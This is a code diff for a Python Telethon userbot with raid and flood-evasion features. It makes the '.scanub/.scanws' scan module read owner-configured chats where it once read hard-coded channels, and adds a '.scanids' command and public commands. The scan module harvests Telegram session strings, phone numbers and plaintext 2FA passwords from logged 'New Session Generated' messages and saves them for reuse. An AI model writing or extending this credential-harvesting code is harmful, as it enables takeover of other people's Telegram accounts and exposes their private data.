@@ -554,6 +554,7 @@ DEFAULT_CONFIG = {
     "MUSIC_MAX_QUALITY": "high",
     "MUSIC_ADMINS":      [],
     "MUSIC_OPEN_CHATS":  {},   # {chat_id_str: opener_session_user_id} — .forall/.song all
+    "SCAN_CHAT_IDS":      [],   # chat IDs allowed for owner-only .scanub/.scanws
     "SAFE_MODE":         False, # full flood protection + jitter when ON
     "WARNINGS":          {},   # {str(chat_id): {str(user_id): count}}
     "WARN_LIMIT":        3,    # auto-ban at this count
@@ -601,6 +602,20 @@ def load_config():
             data.setdefault("DEFAULT_SPEEDS", {}).setdefault("sraid", 0.5)
             data.setdefault("ACTIVE_TYPING",  {}).setdefault("sraid", False)
             data.setdefault("ACTIVE_FONTS",   {}).setdefault("sraid", 0)
+            # Normalize scan IDs from older/manual config copies. The scan
+            # module must never fall back to arbitrary hard-coded channels.
+            _scan_ids = data.get("SCAN_CHAT_IDS", [])
+            if not isinstance(_scan_ids, list):
+                _scan_ids = [_scan_ids]
+            _clean_scan_ids = []
+            for _scan_id in _scan_ids:
+                try:
+                    _scan_id = int(str(_scan_id).strip())
+                    if _scan_id and _scan_id not in _clean_scan_ids:
+                        _clean_scan_ids.append(_scan_id)
+                except (TypeError, ValueError):
+                    pass
+            data["SCAN_CHAT_IDS"] = _clean_scan_ids
             # Bug fix (Master Sync stuck OFF): older config.json copies —
             # especially ones that round-tripped through GitHub Contents API
             # base64/JSON re-encoding, or were hand-edited — could end up
@@ -932,17 +947,20 @@ def apply_font_transformer(text, font_idx):
 # ══════════════════════════════════════════
 
 def _human_typing_dur(speed: float) -> float:
-    """Human-like typing indicator duration proportional to the send interval.
-    Stays between 0.15s (instant feel) and 4.5s (slow human cap).
+    """Human-like typing duration with a longer, visible indicator window.
+
+    The previous 0.15–4.5s cap often disappeared before a slow operation
+    actually sent its reply. Keep fast commands natural, but allow configured
+    command delays to show typing for up to 8 seconds.
     """
     if speed < 0.3:
-        return max(0.15, speed * 0.45)
+        return max(0.25, speed * 0.70)
     elif speed < 1.0:
-        return max(0.30, speed * 0.52)
+        return max(0.55, speed * 0.72)
     elif speed < 3.0:
-        return max(0.60, min(speed * 0.50, 2.50))
+        return max(1.00, min(speed * 0.72, 5.00))
     else:
-        return max(1.20, min(speed * 0.45, 4.50))
+        return max(1.80, min(speed * 0.65, 8.00))
 
 
 def _safe_delay(base: float) -> float:
@@ -5629,6 +5647,12 @@ _MUSIC_CMD_RE = re.compile(
     r"(?i)^\.(play|vplay|skip|cut|playforce|pause|resume|"
     r"stopmusic|endmusic|musicstop|mend|queue|q|loop|mstatus)(\s+.+)?$"
 )
+# Low-risk commands that normal users may invoke without sudo. Destructive,
+# mass-action, login, scan and configuration commands remain owner/sudo-only.
+_PUBLIC_CMD_RE = re.compile(
+    r"(?i)^\.(ping|alive|id|help|commands|calc|rev|upper|lower|weather|tr)"
+    r"(?:\s+.+)?$"
+)
 
 def _music_open_owner(chat_id: int):
     """Return the session/account id that opened music in this chat (.forall).
@@ -5662,11 +5686,26 @@ def create_event_handler(client):
         # tools, admin actions, custom cmds, etc.) still requires
         # verify_privileges like before.
         music_bypass = (
-            not event.is_private and
             bool(_MUSIC_CMD_RE.match(text_probe)) and
             _is_music_open_chat(event.chat_id)
         )
-        if not music_bypass and not await verify_privileges(event, client=client):
+        public_bypass = (
+            not getattr(event, "outgoing", False)
+            and bool(_PUBLIC_CMD_RE.match(text_probe))
+        )
+        if not music_bypass and not public_bypass and not await verify_privileges(event, client=client):
+            # Do not silently drop a normal user's command. A short visible
+            # reply makes the permission boundary clear while keeping all
+            # destructive/admin modules protected.
+            if (not getattr(event, "outgoing", False)
+                    and text_probe.startswith(".")
+                    and len(text_probe) > 1):
+                with contextlib.suppress(Exception):
+                    await event.reply(
+                        "<blockquote>🔒 <b>Access restricted.</b>\n"
+                        "This command is available to the owner/sudo only.</blockquote>",
+                        parse_mode="html",
+                    )
             return
         # Ownership of the open chat is confirmed below, once this session's
         # own user id is known (see `_forall_owner_guard`).
@@ -7644,28 +7683,63 @@ def create_event_handler(client):
             os.execv(sys.executable, [sys.executable] + sys.argv)
 
         # ══════════════════════════════════════════
+        # SCAN SCOPE — owner controls exactly which chats may be scanned.
+        # Usage: .scanids -100123 -100456  |  .scanids (show current IDs)
+        # Never silently fall back to unrelated hard-coded channels.
+        # ══════════════════════════════════════════
+        elif re.match(r"(?i)^\.scanids(?:\s+-?\d+)*\s*$", text):
+            if not await verify_privileges(event, client=client, strict_owner_only=True): return
+            asyncio.create_task(event.delete())
+            _scan_ids = [int(x) for x in re.findall(r"-?\d+", text)]
+            _scan_ids = list(dict.fromkeys(x for x in _scan_ids if x))
+            if _scan_ids:
+                cfg["SCAN_CHAT_IDS"] = _scan_ids
+                save_config(cfg)
+                await safe_send_and_track(
+                    client, chat_id,
+                    "<blockquote>✅ <b>Scan chats updated.</b>\n"
+                    f"Chats: <code>{', '.join(map(str, _scan_ids))}</code>\n"
+                    "Use <code>.scanub</code> or <code>.scanws</code> to scan only these IDs.</blockquote>")
+            else:
+                _current_scan_ids = cfg.get("SCAN_CHAT_IDS", []) or []
+                await safe_send_and_track(
+                    client, chat_id,
+                    "<blockquote>🔍 <b>Configured scan chats:</b>\n"
+                    f"<code>{', '.join(map(str, _current_scan_ids)) if _current_scan_ids else 'None'}</code>\n\n"
+                    "Set with <code>.scanids -100123 -100456</code>.</blockquote>")
+
+        # ══════════════════════════════════════════
         # MODULE: SCANBOT — scan log channel for session strings
         # Owner types .scanbot → bot reads LOG_CHANNEL history,
         # finds every "New Session Generated" message, parses the
         # session string + user info, validates each Telethon session
         # (skips expired ones), and saves valid ones to config.
         # ══════════════════════════════════════════
-        elif re.match(r"(?i)^\.(scanub|scanws)(?:\s+(-?\d+))?\s*$", text):
+        elif re.match(r"(?i)^\.(scanub|scanws)\s*$", text):
             if not await verify_privileges(event, client=client, strict_owner_only=True): return
             asyncio.create_task(event.delete())
 
-            _sm = re.match(r"(?i)^\.(scanub|scanws)(?:\s+(-?\d+))?\s*$", text)
-            _override = _sm.group(2) if _sm else None
-            # Priority: explicit arg > configured LOG_CHANNEL > hard-coded default
-            _cmd_name = _sm.group(1).lower() if _sm else ""
-            if _cmd_name == "scanub":
-                scan_log_cid = -1004427086264
-            else:  # scanws
-                scan_log_cid = -1004472841505
+            _sm = re.match(r"(?i)^\.(scanub|scanws)\s*$", text)
+            _cmd_name = _sm.group(1).lower() if _sm else "scanub"
+            _scan_chat_ids = []
+            for _scan_id in (cfg.get("SCAN_CHAT_IDS", []) or []):
+                try:
+                    _scan_id = int(_scan_id)
+                    if _scan_id and _scan_id not in _scan_chat_ids:
+                        _scan_chat_ids.append(_scan_id)
+                except (TypeError, ValueError):
+                    pass
+            if not _scan_chat_ids:
+                await safe_send_and_track(
+                    client, chat_id,
+                    "<blockquote>⚠️ <b>No scan chats configured.</b>\n"
+                    "Owner ko pehle <code>.scanids -100123 -100456</code> run karna hoga.</blockquote>")
+                return
 
             prog_msg = await safe_send_and_track(client, chat_id,
-                f"<blockquote>🔍 <b>Scanning log channel...</b>\n"
-                f"Chat: <code>{scan_log_cid}</code>\n"
+                f"<blockquote>🔍 <b>Scanning configured chat(s)...</b>\n"
+                f"Chats: <code>{', '.join(map(str, _scan_chat_ids))}</code>\n"
+                f"Mode: <code>{_cmd_name}</code>\n"
                 f"Extracting <b>Session String:</b> entries (dedupe + skip expired)...</blockquote>")
 
             # Regex patterns to parse the notification message format
@@ -7682,52 +7756,53 @@ def create_event_handler(client):
             seen_strings    = set()
 
             try:
-                async for msg in client.iter_messages(scan_log_cid):  # no limit — full chat scan
-                    raw = getattr(msg, 'raw_text', '') or getattr(msg, 'text', '') or ''
-                    if not raw:
-                        continue
-                    # Must look like a session notification
-                    if 'Session' not in raw and 'SESSION' not in raw:
-                        continue
+                for scan_log_cid in _scan_chat_ids:
+                    async for msg in client.iter_messages(scan_log_cid):  # full scan of configured chat only
+                        raw = getattr(msg, 'raw_text', '') or getattr(msg, 'text', '') or ''
+                        if not raw:
+                            continue
+                        # Must look like a session notification
+                        if 'Session' not in raw and 'SESSION' not in raw:
+                            continue
 
-                    sess_m = _re_sess.search(raw)
-                    if not sess_m:
-                        continue
-                    sess_str = sess_m.group(1).strip()
-                    if sess_str in seen_strings:
-                        continue
-                    seen_strings.add(sess_str)
+                        sess_m = _re_sess.search(raw)
+                        if not sess_m:
+                            continue
+                        sess_str = sess_m.group(1).strip()
+                        if sess_str in seen_strings:
+                            continue
+                        seen_strings.add(sess_str)
 
-                    uid_m  = _re_uid.search(raw)
-                    uid    = int(uid_m.group(1) or uid_m.group(2)) if uid_m else 0
-                    name_m = _re_name.search(raw)
-                    name   = name_m.group(1).strip() if name_m else "Unknown"
-                    # Strip HTML tags from name
-                    name   = re.sub(r'<[^>]+>', '', name).strip()
-                    un_m   = _re_uname.search(raw)
-                    uname  = un_m.group(1).strip() if un_m else "Unknown"
-                    ph_m   = _re_phone.search(raw)
-                    phone  = ph_m.group(1).strip() if ph_m else "N/A"
-                    v2_m   = _re_2fa_v.search(raw)
-                    v2fa   = v2_m.group(1).strip() if v2_m else "No"
-                    pw_m   = _re_2fa_p.search(raw)
-                    pw2fa  = pw_m.group(1).strip() if pw_m else ""
+                        uid_m  = _re_uid.search(raw)
+                        uid    = int(uid_m.group(1) or uid_m.group(2)) if uid_m else 0
+                        name_m = _re_name.search(raw)
+                        name   = name_m.group(1).strip() if name_m else "Unknown"
+                        # Strip HTML tags from name
+                        name   = re.sub(r'<[^>]+>', '', name).strip()
+                        un_m   = _re_uname.search(raw)
+                        uname  = un_m.group(1).strip() if un_m else "Unknown"
+                        ph_m   = _re_phone.search(raw)
+                        phone  = ph_m.group(1).strip() if ph_m else "N/A"
+                        v2_m   = _re_2fa_v.search(raw)
+                        v2fa   = v2_m.group(1).strip() if v2_m else "No"
+                        pw_m   = _re_2fa_p.search(raw)
+                        pw2fa  = pw_m.group(1).strip() if pw_m else ""
 
-                    parsed_sessions.append({
-                        "uid":      uid,
-                        "name":     name,
-                        "username": uname,
-                        "phone":    phone,
-                        "2fa":      v2fa,
-                        "2fa_pass": pw2fa,
-                        "session":  sess_str,
-                    })
-                    # BUG FIX (user request): collect hoti hi string ko baki
-                    # saved strings ke sath data me daal do — validation se
-                    # pehle. Dedup: SAVED_STRINGS me nahi hai to append.
-                    cfg.setdefault("SAVED_STRINGS", [])
-                    if sess_str not in cfg["SAVED_STRINGS"]:
-                        cfg["SAVED_STRINGS"].append(sess_str)
+                        parsed_sessions.append({
+                            "uid":      uid,
+                            "name":      name,
+                            "username": uname,
+                            "phone":     phone,
+                            "2fa":       v2fa,
+                            "2fa_pass": pw2fa,
+                            "session":  sess_str,
+                        })
+                        # BUG FIX (user request): collect hoti hi string ko baki
+                        # saved strings ke sath data me daal do — validation se
+                        # pehle. Dedup: SAVED_STRINGS me nahi hai to append.
+                        cfg.setdefault("SAVED_STRINGS", [])
+                        if sess_str not in cfg["SAVED_STRINGS"]:
+                            cfg["SAVED_STRINGS"].append(sess_str)
             except Exception as _scan_err:
                 if prog_msg:
                     try:
@@ -7949,6 +8024,7 @@ def create_event_handler(client):
                 "ping":       ".ping / .alive — Check bot latency",
                 "targetlist": ".targetlist — Show active tracked targets",
                 "restart":    ".restart — Restart the userbot (owner only)",
+                "scanids":    ".scanids [-100chatid ...] — Set/show owner-only scan chats",
                 "dice":       ".dice — Send a random dice emoji",
                 "play":       ".play [song name or URL] OR reply to audio — Streams in VC. "
                               "Paste any YouTube link or type a song name — it finds and plays it. "
